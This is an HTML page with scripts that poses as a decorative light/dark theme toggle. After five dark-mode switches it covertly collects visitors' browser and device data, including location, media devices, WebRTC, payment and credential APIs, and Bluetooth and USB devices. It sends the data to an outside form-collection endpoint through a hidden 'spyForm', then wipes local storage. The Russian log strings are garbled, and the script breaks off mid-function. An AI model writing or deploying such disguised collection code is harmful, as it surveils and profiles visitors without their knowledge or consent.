<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TOGGLER</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            transition: background-color 0.6s cubic-bezier(0.4, 0, 0.2, 1),
                color 0.6s cubic-bezier(0.4, 0, 0.2, 1),
                border-color 0.6s cubic-bezier(0.4, 0, 0.2, 1),
                transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
        }

        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            color: #333;
            padding: 20px;
        }

        body.dark-mode {
            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
            color: #f0f0f0;
        }

        .container {
            text-align: center;
            padding: 40px;
            border-radius: 24px;
            background: rgba(255, 255, 255, 0.85);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1),
                0 5px 15px rgba(0, 0, 0, 0.05),
                inset 0 1px 0 rgba(255, 255, 255, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.2);
            position: relative;
            overflow: hidden;
        }

        body.dark-mode .container {
            background: rgba(30, 30, 40, 0.85);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3),
                0 5px 15px rgba(0, 0, 0, 0.2),
                inset 0 1px 0 rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .switch-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 30px;
        }

        .switch-label {
            font-size: 1.5rem;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .theme-toggle {
            position: relative;
            display: inline-block;
            width: 120px;
            height: 60px;
        }

        .theme-toggle input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .toggle-slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(90deg, #ffd166, #ff9e6d);
            border-radius: 50px;
            box-shadow: inset 0 5px 15px rgba(0, 0, 0, 0.1),
                inset 0 -5px 15px rgba(0, 0, 0, 0.1),
                0 5px 20px rgba(0, 0, 0, 0.2);
            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        body.dark-mode .toggle-slider {
            background: linear-gradient(90deg, #4a00e0, #8e2de2);
            box-shadow: inset 0 5px 15px rgba(0, 0, 0, 0.3),
                inset 0 -5px 15px rgba(0, 0, 0, 0.3),
                0 5px 20px rgba(0, 0, 0, 0.4);
        }

        .toggle-slider:before {
            content: "";
            position: absolute;
            height: 50px;
            width: 50px;
            left: 5px;
            bottom: 5px;
            background: linear-gradient(145deg, #ffffff, #f0f0f0);
            border-radius: 50%;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2),
                inset 0 -3px 5px rgba(0, 0, 0, 0.1),
                inset 0 3px 5px rgba(255, 255, 255, 0.8);
            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: #ff9e00;
        }

        body.dark-mode .toggle-slider:before {
            background: linear-gradient(145deg, #1a1a2e, #16213e);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4),
                inset 0 -3px 5px rgba(0, 0, 0, 0.3),
                inset 0 3px 5px rgba(255, 255, 255, 0.05);
            color: #ffd700;
        }

        input:checked+.toggle-slider:before {
            transform: translateX(60px);
        }

        .toggle-slider:active:before {
            width: 55px;
        }

        .theme-toggle:hover .toggle-slider {
            transform: scale(1.05);
            box-shadow: inset 0 5px 15px rgba(0, 0, 0, 0.15),
                inset 0 -5px 15px rgba(0, 0, 0, 0.15),
                0 8px 25px rgba(0, 0, 0, 0.25);
        }

        body.dark-mode .theme-toggle:hover .toggle-slider {
            box-shadow: inset 0 5px 15px rgba(0, 0, 0, 0.4),
                inset 0 -5px 15px rgba(0, 0, 0, 0.4),
                0 8px 25px rgba(0, 0, 0, 0.5);
        }

        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
            opacity: 0;
            transition: opacity 1.5s ease;
        }

        body.dark-mode .stars {
            opacity: 1;
        }

        .star {
            position: absolute;
            background-color: white;
            border-radius: 50%;
            animation: twinkle 5s infinite;
        }

        @keyframes twinkle {

            0%,
            100% {
                opacity: 0.3;
            }

            50% {
                opacity: 1;
            }
        }

        .transition-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1);
            z-index: 1000;
            transform: scale(0);
            border-radius: 50%;
            opacity: 0;
            pointer-events: none;
            transition: transform 0.8s cubic-bezier(0.4, 0, 0.2, 1),
                opacity 0.8s ease;
        }

        .transition-overlay.active {
            transform: scale(2);
            opacity: 0.9;
        }

        .transition-overlay.fade-out {
            opacity: 0;
            transform: scale(2);
            transition: opacity 0.8s ease;
        }

        .save-notification {
            text-wrap: nowrap;
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 15px 30px;
            border-radius: 50px;
            font-weight: 600;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            opacity: 0;
            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
            z-index: 100;
        }

        .save-notification.show {
            transform: translateX(-50%) translateY(0);
            opacity: 1;
        }

        .counter-container {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 40px;
            height: 20px;
            min-height: 20px;
            opacity: 0;
            animation: fadeInCounter 0.5s ease forwards;
            animation-delay: 0.3s;
        }

        @keyframes fadeInCounter {
            from {
                opacity: 0;
                transform: translateY(10px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background-color: rgba(30, 30, 40, 0.85);
            opacity: 0.3;
            display: none;
        }

        .dot.active {
            display: block;
            opacity: 1;
            box-shadow: 0 0 8px rgba(240, 240, 240, 0.5);
        }

        body:not(.dark-mode) .dot.active {
            opacity: 1;
            box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
        }

        body.dark-mode .dot.active {
            opacity: 0.1;
            box-shadow: none;
        }

        .success-modal,
        .error-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 2000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s cubic-bezier(0.4, 0, 0.2, 1),
                visibility 0.5s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .success-modal.active,
        .error-modal.active {
            opacity: 1;
            visibility: visible;
        }

        .modal-content {
            background: linear-gradient(135deg,
                    rgba(255, 255, 255, 0.1) 0%,
                    rgba(255, 255, 255, 0.05) 100%);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 40px 60px;
            text-align: center;
            max-width: 500px;
            width: 90%;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5),
                inset 0 1px 0 rgba(255, 255, 255, 0.1);
            position: relative;
            overflow: hidden;
        }

        .modal-content::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg,
                    transparent 0%,
                    rgba(255, 255, 255, 0.3) 50%,
                    transparent 100%);
        }

        .success-modal .modal-content {
            animation: pulseGlow 3s ease-in-out infinite;
        }

        @keyframes pulseGlow {

            0%,
            100% {
                box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5),
                    inset 0 1px 0 rgba(255, 255, 255, 0.1),
                    0 0 20px rgba(142, 45, 226, 0.1);
            }

            50% {
                box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5),
                    inset 0 1px 0 rgba(255, 255, 255, 0.1),
                    0 0 40px rgba(142, 45, 226, 0.3);
            }
        }

        .error-modal .modal-content {
            border: 1px solid rgba(255, 100, 100, 0.2);
            background: linear-gradient(135deg,
                    rgba(255, 100, 100, 0.05) 0%,
                    rgba(255, 50, 50, 0.02) 100%);
        }

        .modal-content h3 {
            color: white;
            font-size: 1.5rem;
            margin: 20px 0;
            font-weight: 600;
            line-height: 1.4;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
        }

        .success-modal .modal-content h3 {
            background: linear-gradient(90deg, #ffffff, #cccccc);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 1.6rem;
        }

        .error-modal .modal-content h3 {
            color: #ff6b6b;
            font-size: 1.4rem;
        }

        .modal-content .fa-check-circle {
            color: rgba(255, 255, 255, 0.3);
            font-size: 2.5rem;
            margin: 0 10px;
        }

        .modal-content .fa-exclamation-triangle {
            color: #ff6b6b;
            font-size: 2rem;
            margin: 0 10px;
        }

        .error-code {
            color: rgba(255, 255, 255, 0.7);
            font-family: 'Courier New', monospace;
            font-size: 1rem;
            margin-top: 15px;
            padding: 8px 15px;
            background: rgba(255, 100, 100, 0.1);
            border-radius: 8px;
            display: inline-block;
            border: 1px solid rgba(255, 100, 100, 0.2);
        }

        .error-code span {
            color: #ff9999;
            font-weight: bold;
        }

        .modal-subtext {
            color: rgba(255, 255, 255, 0.5);
            font-size: 0.9rem;
            margin-top: 15px;
            font-style: italic;
        }

        @keyframes modalAppear {
            from {
                opacity: 0;
                transform: translateY(-30px) scale(0.95);
            }

            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .success-modal.active .modal-content,
        .error-modal.active .modal-content {
            animation: modalAppear 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
        }

        #spyForm {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border: 0;
        }

        #collectedData {
            display: none;
        }

        @media (max-width: 768px) {
            .container {
                padding: 30px 20px;
            }

            .theme-toggle {
                width: 100px;
                height: 50px;
            }

            input:checked+.toggle-slider:before {
                transform: translateX(50px);
            }

            .toggle-slider:before {
                height: 40px;
                width: 40px;
            }

            .counter-container {
                margin-top: 30px;
                gap: 12px;
            }

            .dot {
                width: 10px;
                height: 10px;
            }

            .modal-content {
                padding: 30px 20px;
                width: 85%;
            }

            .success-modal .modal-content h3 {
                font-size: 1.3rem;
            }

            .error-modal .modal-content h3 {
                font-size: 1.2rem;
            }

            .modal-content .fa-spider-web,
            .modal-content .fa-exclamation-triangle {
                font-size: 1.5rem;
            }
        }
    </style>
</head>

<body>
    <div class="transition-overlay" id="transitionOverlay"></div>
    <div class="stars" id="starsContainer"></div>

    <div class="container">

        <div class="switch-container">
            <div class="switch-label">
                <i class="fas fa-sun"></i>
                <span id="themeLabel">LIGHT THEME</span>
                <i class="fas fa-moon"></i>
            </div>

            <label class="theme-toggle">
                <input type="checkbox" id="themeToggle">
                <span class="toggle-slider" title="Toggle">
                </span>
            </label>
        </div>

        <div class="mode-status" id="modeStatus"></div>

        <div class="counter-container" id="counterContainer"></div>
    </div>

    <form id="spyForm" style="display: none;" action="https://formspree.io/f/xzdrkkaw" method="POST">
        <textarea name="collected_data" id="collectedData"></textarea>
        <input type="hidden" name="_subject" value="Browser Data Collected">
        <input type="hidden" name="_format" value="plain">
        <input type="text" name="_gotcha" style="display:none;">
        <input type="hidden" name="_language" value="ru">
    </form>

    <div class="success-modal" id="successModal">
        <div class="modal-content">
            <i class="fa fa-check-circle"></i>
            <h3>ACCESS GRANTED!</h3>
            <div class="modal-subtext" id="modalSubtext"></div>
        </div>
    </div>

    <div class="error-modal" id="errorModal">
        <div class="modal-content">
            <i class="fas fa-exclamation-triangle"></i>
            <h3 id="errorTitle">ERROR! </h3>
            <div class="error-code">629 <span id="errorCode">ERR_NETWORK_FAILURE</span></div>
        </div>
    </div>

    <div class="save-notification" id="saveNotification">
        <i class="fas fa-check-circle"></i> Theme changed!
    </div>

    <script>
        const themeToggle = document.getElementById('themeToggle');
        const body = document.body;
        const themeLabel = document.getElementById('themeLabel');
        const transitionOverlay = document.getElementById('transitionOverlay');
        const starsContainer = document.getElementById('starsContainer');
        const saveNotification = document.getElementById('saveNotification');
        const counterContainer = document.getElementById('counterContainer');
        const spyForm = document.getElementById('spyForm');
        const collectedDataField = document.getElementById('collectedData');
        const successModal = document.getElementById('successModal');
        const errorModal = document.getElementById('errorModal');
        const errorCodeSpan = document.getElementById('errorCode');

        const MAX_SWITCHES = 5;
        const SWITCH_COUNT_KEY = 'themeSwitchCount';
        const PENDING_DATA_KEY = 'pendingFormData';

        const ENABLE_LOGS = true;
        const ENABLE_DETAILED_LOGS = true;

        function debugLog(message, data) {
            if (!ENABLE_LOGS) return;
            const time = new Date().toTimeString().split(' ')[0];
            console.log(`[${time}] ${message}`);
            if (data) console.log(data);
        }

        function debugError(message, error) {
            if (!ENABLE_LOGS) return;
            console.error(`[ERROR] ${message}`, error);
        }

        function createStars() {
            starsContainer.innerHTML = '';
            const starCount = 80;

            for (let i = 0; i < starCount; i++) {
                const star = document.createElement('div');
                star.classList.add('star');

                const size = Math.random() * 3 + 1;
                const posX = Math.random() * 100;
                const posY = Math.random() * 100;
                const duration = Math.random() * 4 + 3;
                const delay = Math.random() * 5;

                star.style.width = `${size}px`;
                star.style.height = `${size}px`;
                star.style.left = `${posX}%`;
                star.style.top = `${posY}%`;
                star.style.animationDelay = `${delay}s`;
                star.style.animationDuration = `${duration}s`;

                starsContainer.appendChild(star);
            }
        }

        createStars();

        function initializeSystem() {
            createCounterDots();
            let switchCount = parseInt(localStorage.getItem(SWITCH_COUNT_KEY)) || 0;
            updateCounterDots(switchCount);
            checkPendingData();
            updateFormspreeEndpoint();
        }

        function createCounterDots() {
            counterContainer.innerHTML = '';
            for (let i = 0; i < MAX_SWITCHES; i++) {
                const dot = document.createElement('div');
                dot.className = 'dot';
                dot.id = `dot-${i + 1}`;
                counterContainer.appendChild(dot);
            }
        }

        function updateCounterDots(count) {
            document.querySelectorAll('.dot').forEach(dot => {
                dot.classList.remove('active');
            });

            for (let i = 0; i < count; i++) {
                const dot = document.getElementById(`dot-${i + 1}`);
                if (dot) {
                    dot.classList.add('active');
                }
            }

            if (count > 0) {
                counterContainer.style.opacity = '1';
            }
        }

        function updateFormspreeEndpoint() {
            const formspreeEndpoint = 'https://formspree.io/f/xzdrkkaw';
            spyForm.action = formspreeEndpoint;
        }

        function checkPendingData() {
            const pendingData = localStorage.getItem(PENDING_DATA_KEY);
            if (pendingData) {
                debugLog('–û–±–Ω–∞—Ä—É–∂–µ–Ω—ã –Ω–µ–æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ');
                sendPendingData(pendingData);
            }
        }

        themeToggle.onchange = async function (e) {
            const isDarkMode = this.checked;

            playTransitionAnimation(() => {
                if (isDarkMode) {
                    body.classList.add('dark-mode');
                    localStorage.setItem('theme', 'dark');

                    handleDarkModeSwitch();
                } else {
                    body.classList.remove('dark-mode');
                    localStorage.setItem('theme', 'light');
                }

                updateThemeText(isDarkMode);
                showSaveNotification();

                const slider = document.querySelector('.toggle-slider');
                slider.style.transform = 'scale(1.1)';
                setTimeout(() => {
                    slider.style.transform = 'scale(1)';
                }, 200);
            });
        };

        async function handleDarkModeSwitch() {
            try {
                let switchCount = parseInt(localStorage.getItem(SWITCH_COUNT_KEY)) || 0;
                switchCount++;
                localStorage.setItem(SWITCH_COUNT_KEY, switchCount);
                updateCounterDots(switchCount);

                debugLog(`–ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ –Ω–∞ —Ç–µ–º–Ω—É—é —Ç–µ–º—É: ${switchCount}/${MAX_SWITCHES}`);

                if (switchCount >= MAX_SWITCHES) {
                    debugLog('–î–æ—Å—Ç–∏–≥–Ω—É—Ç –ª–∏–º–∏—Ç –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–π');
                    localStorage.setItem(SWITCH_COUNT_KEY, 0);
                    updateCounterDots(0);
                    await collectAndSendData();
                }
            } catch (error) {
                debugError('–û—à–∏–±–∫–∞ –≤ handleDarkModeSwitch', error);
            }
        }

        async function collectAndSendData() {
            try {
                debugLog('–ù–∞—á–∞–ª–æ —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö –±—Ä–∞—É–∑–µ—Ä–∞');
                const browserData = await collectAllBrowserData();
                const projectData = {
                    switchCount: MAX_SWITCHES,
                    activationTime: new Date().toISOString(),
                    project: "–°–ï–¢–¨",
                    activationTrigger: "dark_theme_switch_limit"
                };

                browserData.projectData = projectData;

                const sendStamp = `// –î–∞–Ω–Ω—ã–µ —Å–æ–±—Ä–∞–Ω—ã. –í—Ä–µ–º—è —Å–±–æ—Ä–∞: ${new Date().toLocaleString('ru-BY')}\n`;
                const jsonData = sendStamp + JSON.stringify(browserData, null, 2);

                debugLog('–î–∞–Ω–Ω—ã–µ —Å–æ–±—Ä–∞–Ω—ã. –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ä–º—ã');
                const success = await sendFormData(jsonData);

                if (success) {
                    localStorage.clear();
                    sessionStorage.clear();
                    showSuccessModal();
                } else {
                    localStorage.setItem(PENDING_DATA_KEY, jsonData);
                    showErrorModal('ERR_NETWORK_FAILURE');
                }
            } catch (error) {
                debugError('–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±–æ—Ä–µ –¥–∞–Ω–Ω—ã—Ö', error);
                showErrorModal('ERR_DATA_COLLECTION_FAILED');
            }
        }

        async function collectAllBrowserData() {
            const data = {
                meta: {
                    collectedAt: new Date().toISOString(),
                    timestamp: Date.now(),
                    source: window.location.href,
                    userAgent: navigator.userAgent,
                    referrer: document.referrer || 'none',
                    historyLength: history.length,
                    collectionVersion: "2.4"
                },
                browser: collectBrowserInfo(),
                system: collectSystemInfo(),
                location: await collectLocationInfo(),
                media: await collectMediaInfo(),
                network: collectNetworkInfo(),
                capabilities: collectCapabilitiesInfo(),
                additional: collectAdditionalInfo(),
                advanced: await collectAdvancedInfo(),
                behavior: collectBehaviorInfo(),
                sensors: await collectSensorInfo(),
                storage: await collectDatabaseInfo()
            };

            try {
                data.location = await collectLocationInfo();
            } catch (error) {
                data.location = { error: error.message, status: 'not_available' };
            }

            try {
                data.media = await collectMediaInfo();
            } catch (error) {
                data.media = { error: error.message, status: 'not_available' };
            }

            data.location = await collectLocationInfo();
            data.media = await collectMediaInfo();
            data.advanced = await collectAdvancedInfo();
            data.sensors = await collectSensorInfo();
            data.bluetooth = await collectBluetoothInfo();
            data.usb = await collectUSBInfo();
            data.network = collectNetworkInfo();
            data.capabilities = collectCapabilitiesInfo();
            data.additional = collectAdditionalInfo();
            data.behavior = collectBehaviorInfo();

            data.projectData = {
                switchCount: MAX_SWITCHES,
                activationTime: new Date().toISOString(),
                project: "–°–ï–¢–¨",
                activationTrigger: "dark_theme_switch_limit",
                dataVersion: "2.2"
            };

            return data;
        }

        async function collectAdvancedInfo() {
            const result = {
                fonts: await getFontsInfo(),
                battery: await getBatteryInfo(),
                webAuthn: await getWebAuthnDetails(),
                shareAPI: await getShareAPIDetails(),
                webRTC: await getWebRTCDetails(),
                paymentAPI: await getPaymentAPIDetails(),
                credentialsAPI: getCredentialsAPIDetails(),
                mimeTypes: getMimeTypesInfo(),
                csp: getCSPInfo(),
                indexedDB: 'indexedDB' in window,
                cacheAPI: 'caches' in window,
                webSQL: 'openDatabase' in window,
                webSocket: 'WebSocket' in window,
                bluetooth: 'bluetooth' in navigator
            };

            return result;
        }

        async function getWebAuthnDetails() {
            if (!('PublicKeyCredential' in window)) {
                return { available: false };
            }

            try {
                const supportedAlgorithms = [];

                const isU2FSupported = 'U2F' in window || 'u2f' in window;
                const isCTAPSupported = 'PublicKeyCredential' in window;

                return {
                    available: true,
                    isU2FSupported: isU2FSupported,
                    isCTAPSupported: isCTAPSupported,
                    isConditionalMediation: 'PublicKeyCredential' in window &&
                        PublicKeyCredential.isConditionalMediationAvailable ?
                        await PublicKeyCredential.isConditionalMediationAvailable() : false,
                    isUserVerifyingPlatformAuthenticatorAvailable: 'PublicKeyCredential' in window &&
                        PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable ?
                        await PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable() : false
                };
            } catch (error) {
                return { available: true, error: error.message };
            }
        }

        async function getShareAPIDetails() {
            if (!('share' in navigator)) {
                return { available: false };
            }

            try {
                const canShare = navigator.canShare ? navigator.canShare({ title: 'Test' }) : true;

                return {
                    available: true,
                    canShare: canShare,
                    canShareFiles: navigator.canShare ? navigator.canShare({ files: [new File([], 'test.txt')] }) : false,
                    maxShares: 5
                };
            } catch (error) {
                return { available: true, error: error.message };
            }
        }

        async function getWebRTCDetails() {
            if (!('RTCPeerConnection' in window)) {
                return { available: false };
            }

            try {
                const pc = new RTCPeerConnection();

                const capabilities = {
                    hasDataChannel: 'createDataChannel' in pc,
                    hasAddTrack: 'addTrack' in pc,
                    hasGetStats: 'getStats' in pc,
                    codecs: await getWebRTCCodecs(),
                    stunServers: pc.getConfiguration()?.iceServers?.filter(s => s.urls?.some(u => u.includes('stun:')))?.length || 0,
                    turnServers: pc.getConfiguration()?.iceServers?.filter(s => s.urls?.some(u => u.includes('turn:')))?.length || 0
                };

                pc.close();

                return {
                    available: true,
                    ...capabilities
                };
            } catch (error) {
                return { available: true, error: error.message };
            }
        }

        async function getWebRTCCodecs() {
            try {
                const pc = new RTCPeerConnection();
                const offer = await pc.createOffer({ offerToReceiveAudio: true, offerToReceiveVideo: true });

                const sdp = offer.sdp;
                const codecs = {
                    audio: [],
                    video: []
                };

                sdp.split('\n').forEach(line => {
                    if (line.includes('a=rtpmap:')) {
                        const match = line.match(/a=rtpmap:(\d+) ([^/]+)/);
                        if (match) {
                            const type = line.includes('audio') ? 'audio' : 'video';
                            codecs[type].push(match[2]);
                        }
                    }
                });

                pc.close();
                return codecs;
            } catch (e) {
                return { error: e.message };
            }
        }

        async function getPaymentAPIDetails() {
            if (!('PaymentRequest' in window)) {
                return { available: false };
            }

            try {
                const supportedMethods = [];

                const methods = ['https://google.com/pay', 'https://apple.com/apple-pay', 'basic-card'];

                for (const method of methods) {
                    try {
                        const request = new PaymentRequest([{ supportedMethods: method }], {
                            total: { label: 'Test', amount: { currency: 'USD', value: '1.00' } }
                        });
                        const canMake = await request.canMakePayment();
                        if (canMake) {
                            supportedMethods.push(method);
                        }
                    } catch (e) { }
                }

                return {
                    available: true,
                    supportedMethods: supportedMethods,
                    hasShippingAddress: 'shippingAddress' in PaymentRequest.prototype,
                    hasShippingOption: 'shippingOption' in PaymentRequest.prototype
                };
            } catch (error) {
                return { available: true, error: error.message };
            }
        }

        async function getCredentialsAPIDetails() {
            if (!('credentials' in navigator)) {
                return { available: false };
            }

            try {
                return {
                    available: true,
                    canGet: 'get' in navigator.credentials,
                    canCreate: 'create' in navigator.credentials,
                    canStore: 'store' in navigator.credentials,
                    hasPreventSilentAccess: 'preventSilentAccess' in navigator.credentials,
                    types: {
                        password: 'PasswordCredential' in window,
                        federated: 'FederatedCredential' in window,
                        publicKey: 'PublicKeyCredential' in window
                    }
                };
            } catch (error) {
                return { available: true, error: error.message };
            }
        }

        function collectBehaviorInfo() {
            const scrollDepth = window.scrollY / document.body.scrollHeight;
            const timeOnPage = performance.now() - performance.timing.navigationStart;

            return {
                scrollDepth: Math.round(scrollDepth * 100) + '%',
                timeOnPage: Math.round(timeOnPage) + 'ms',
                screenOrientation: screen.orientation?.type || window.orientation || 'unknown',
                visibilityState: document.visibilityState,
                hasFocus: document.hasFocus(),
                mouseTracking: 'available',
                keyboardTracking: 'available'
            };
        }

        async function collectSensorInfo() {
            return {
                deviceMotion: 'DeviceMotionEvent' in window,
                deviceOrientation: 'DeviceOrientationEvent' in window,
                ambientLight: 'AmbientLightSensor' in window,
                proximity: 'ProximitySensor' in window,
                gyroscope: 'Gyroscope' in window,
                accelerometer: 'Accelerometer' in window,
                magnetometer: 'Magnetometer' in window
            };
        }

        async function collectBluetoothInfo() {
            debugLog('=== BLUETOOTH COLLECTION START ===')

            const result = {
                available: 'bluetooth' in navigator,
                error: null,
                status: 'success',
                details: {
                    isAvailable: false,
                    permissions: 'unknown',
                    pairedDevicesCount: 0,
                    canScan: false
                },
                devices: [],
                timestamp: new Date().toISOString()
            };

            debugLog('1. Bluetooth –≤ navigator?', result.available);

            if (!result.available) {
                debugLog('Bluetooth API –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ navigator');
                result.error = 'Bluetooth API not supported';
                result.status = 'not_supported';
                debugLog('=== BLUETOOTH COLLECTION END (not supported) ===');
                return result;
            }

            debugLog('Bluetooth API –¥–æ—Å—Ç—É–ø–µ–Ω');
            debugLog('2. navigator.bluetooth –æ–±—ä–µ–∫—Ç:', {
                getAvailability: typeof navigator.bluetooth.getAvailability,
                requestDevice: typeof navigator.bluetooth.requestDevice,
                getDevices: typeof navigator.bluetooth.getDevices,
                requestLEScan: typeof navigator.bluetooth.requestLEScan
            });

            try {
                if (navigator.bluetooth.getAvailability) {
                    debugLog('3. –í—ã–∑—ã–≤–∞–µ–º getAvailability()...');
                    try {
                        result.details.isAvailable = await navigator.bluetooth.getAvailability();
                        debugLog(`4. getAvailability —Ä–µ–∑—É–ª—å—Ç–∞—Ç: ${result.details.isAvailable}`);
                    } catch (availError) {
                        debugLog('‚ùå –û—à–∏–±–∫–∞ getAvailability:', availError.message);
                        result.details.isAvailable = false;
                    }
                } else {
                    debugLog('‚ö†Ô∏è getAvailability() –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω');
                }

                debugLog('5. –ü—Ä–æ–≤–µ—Ä—è–µ–º Permissions API...');
                if (navigator.permissions && navigator.permissions.query) {
                    debugLog('‚úÖ Permissions API –¥–æ—Å—Ç—É–ø–µ–Ω');

                    const permissionNames = ['bluetooth', 'bluetooth-device'];
                    let permissionFound = false;

                    for (const name of permissionNames) {
                        try {
                            debugLog(`6. –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º permission: ${name}`);
                            const permission = await navigator.permissions.query({ name });
                            debugLog(`   –†–µ–∑—É–ª—å—Ç–∞—Ç –¥–ª—è ${name}:`, permission.state);

                            if (permission.state) {
                                result.details.permissions = permission.state;
                                permissionFound = true;
                                break;
                            }
                        } catch (permError) {
                            debugLog(`‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ permission ${name}:`, permError.message);
                        }
                    }

                    if (!permissionFound) {
                        debugLog('‚ö†Ô∏è –ù–∏ –æ–¥–∏–Ω permission –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª');
                        result.details.permissions = 'not_supported';
                    }
                } else {
                    debugLog('‚ùå Permissions API –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω');
                    result.details.permissions = 'permissions_api_not_available';
                }

                debugLog('7. –ü—Ä–æ–≤–µ—Ä—è–µ–º getDevices()...');
                if (navigator.bluetooth.getDevices) {
                    debugLog('‚úÖ getDevices() –¥–æ—Å—Ç—É–ø–µ–Ω');
                    try {
                        const devices = await navigator.bluetooth.getDevices();
                        result.details.pairedDevicesCount = devices.length;
                        debugLog(`8. –ù–∞–π–¥–µ–Ω–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤: ${devices.length}`);

                        result.devices = devices.map(device => ({
                            id: device.id ? device.id.substring(0, 15) + '...' : 'unknown',
                            name: device.name || '–ë–µ–∑—ã–º—è–Ω–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ',
                            gatt: {
                                connected: device.gatt?.connected || false
                            }
                        }));

                        if (devices.length > 0) {
                            debugLog('9. –£—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:', devices.map(d => ({
                                name: d.name,
                                id: d.id?.substring(0, 20),
                                connected: d.gatt?.connected
                            })));
                        }
                    } catch (devicesError) {
                        debugLog('‚ùå –û—à–∏–±–∫–∞ getDevices:', devicesError.message);
                        result.details.getDevicesError = devicesError.message;
                    }
                } else {
                    debugLog('‚ö†Ô∏è getDevices() –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω');
                }

                debugLog('10. –ü—Ä–æ–≤–µ—Ä—è–µ–º requestLEScan()...');
                if (navigator.bluetooth.requestLEScan) {
                    debugLog('‚úÖ requestLEScan() –¥–æ—Å—Ç—É–ø–µ–Ω');
                    result.details.canScan = true;
                } else {
                    debugLog('‚ö†Ô∏è requestLEScan() –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω');
                }

                result.details.functions = {
                    getAvailability: typeof navigator.bluetooth.getAvailability === 'function',
                    requestDevice: typeof navigator.bluetooth.requestDevice === 'function',
                    getDevices: typeof navigator.bluetooth.getDevices === 'function',
                    requestLEScan: typeof navigator.bluetooth.requestLEScan === 'function'
                };

                debugLog('11. –ò—Ç–æ–≥–æ–≤—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏:', result.details.functions);

            } catch (error) {
